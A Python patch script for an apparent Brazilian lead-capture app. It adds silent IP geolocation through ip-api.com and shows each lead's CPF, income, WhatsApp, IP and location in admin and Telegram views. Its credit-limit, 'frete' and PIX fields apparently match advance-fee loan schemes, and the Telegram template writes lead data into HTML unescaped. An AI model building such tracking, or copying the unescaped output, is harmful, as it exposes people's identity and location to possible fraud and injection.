import re
import sqlite3

# 1. Update Database Schema
try:
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("ALTER TABLE leads ADD COLUMN location TEXT DEFAULT ''")
    conn.commit()
    conn.close()
except sqlite3.OperationalError:
    pass # Column already exists

# 2. Update app.py to fetch Geo
app_path = "app.py"
with open(app_path, "r", encoding="utf-8") as f:
    app_code = f.read()

# Let's insert the Geo Fetch logic inside api_lead
geo_logic = """
    # Calcula limite avançado
    analise       = calc_limite(renda, tipo_renda, motivo)
    limite        = analise["limite"]
    frete         = analise["frete"]

    client_ip = _ip()
    client_loc = ""
    try:
        import requests
        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city", timeout=2)
        if geo_res.status_code == 200:
            gd = geo_res.json()
            if gd.get("status") == "success":
                client_loc = f"{gd.get('city', '')} - {gd.get('regionName', '')}, {gd.get('country', '')}"
    except Exception:
        pass
        
    db = get_db()
"""

if "client_loc = f" not in app_code:
    app_code = app_code.replace("""
    # Calcula limite avançado
    analise       = calc_limite(renda, tipo_renda, motivo)
    limite        = analise["limite"]
    frete         = analise["frete"]

    db = get_db()""", geo_logic)

    # Now update the UPDATE query
    app_code = app_code.replace(
        "utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?,",
        "utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,"
    )
    app_code = app_code.replace(
        "utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, sid))",
        "utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))"
    )

    # Now update the INSERT query
    app_code = app_code.replace(
        "utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck)",
        "utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location)"
    )
    app_code = app_code.replace(
        "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"
    )
    app_code = app_code.replace(
        "utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck)",
        "utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc)"
    )
    app_code = app_code.replace(
        "(sid, _ip(), cpf",
        "(sid, client_ip, cpf"
    )
    with open(app_path, "w", encoding="utf-8") as f:
        f.write(app_code)


# 3. Update admin_dashboard.html
admin_path = "templates/admin_dashboard.html"
with open(admin_path, "r", encoding="utf-8") as f:
    admin_html = f.read()

admin_html = admin_html.replace(
    "<th>Nome</th><th>CPF</th><th>Renda</th><th>Limite</th><th>PIX</th>",
    "<th>Nome</th><th>CPF</th><th>IP & Geo</th><th>Renda</th><th>Limite</th><th>PIX</th>"
)
admin_html = admin_html.replace(
    "<td>{{ l.cpf }}</td>\n                <td>R$ {{ l.renda }}</td>",
    "<td>{{ l.cpf }}</td>\n                <td style='font-size:0.75rem; color:var(--text-muted)'>{{ l.ip }}<br>{{ l.location }}</td>\n                <td>R$ {{ l.renda }}</td>"
)
with open(admin_path, "w", encoding="utf-8") as f:
    f.write(admin_html)

# 4. Update tg_webapp.html
tg_path = "templates/tg_webapp.html"
with open(tg_path, "r", encoding="utf-8") as f:
    tg_html = f.read()

tg_replace = """
          <div class="lead-card" onclick="tg.showAlert('CPF: ${l.cpf}\\nNome: ${l.nome}\\nWhatsApp: ${l.whatsapp || '-'}\\nIP: ${l.ip || '-'}\\nGeo: ${l.location || '-'}')">
            <div>
              <div class="l-name">${l.nome}</div>
              <div class="l-doc">${l.cpf} • R$ ${l.renda || '0'}</div>
              <div style="font-size:0.65rem; color:var(--text-dim); margin-top:4px;">📍 ${l.location || l.ip || 'Sem Localização'}</div>
            </div>
            <div class="badge ${st}">${stTxt}</div>
          </div>
"""
tg_html = re.sub(r'<div class="lead-card".*?</div>\s*</div>\s*</div>', tg_replace.strip(), tg_html, flags=re.DOTALL)
with open(tg_path, "w", encoding="utf-8") as f:
    f.write(tg_html)

print("Geo Update Completed!")
